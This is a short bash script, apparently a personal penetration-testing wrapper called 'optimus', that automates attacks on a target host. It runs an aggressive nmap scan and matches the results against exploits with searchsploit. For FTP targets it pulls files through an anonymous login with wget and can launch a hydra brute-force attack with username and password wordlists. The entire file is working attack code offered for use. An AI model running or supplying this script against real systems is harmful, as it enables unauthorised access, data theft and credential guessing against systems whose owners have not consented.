#!/usr/bin/bash

#Flags:

#The u: means u will need a value if called
#Example for 4 flags parameters:

orange='\033[93m' 

while getopts t:r:p:hfl: option
do
	case "${option}"
		in
		t) host=${OPTARG};;
		r) protocol=${OPTARG};;
		p) port=${OPTARG};;
		l) threads=${OPTARG};;
		f) full="true";;
		h)  echo -e "$orange\nusage: optimus [-t host/ip][-r protocol][-p port][-l treads], -h for help
Options -f - full scan

Currently supported protocols: FTP\n" && exit

	esac
done

# General cross protocol check

nmap $host -p $port -A -oA optimus_nmap_$protocol_$port 
searchsploit --nmap optimus_nmap_$protocol_$port.xml -v 


# FTP

if [ "$protocol" == "ftp" ]  
then

#Anonymoius logon+file pulling

	wget -m ftp://anonymous:anonymous@$host --no-passive

	if [ "$full" == "true" ]
	then
#Hydra bruteforcei
		hydra -L ~/Documents/Attacks/Bruteforce/commonUserShort.txt -P ~/Documents/Attacks/Bruteforce/xato-10000.txt -t $threads  ftp://$host:$port -vvv
	fi
fi
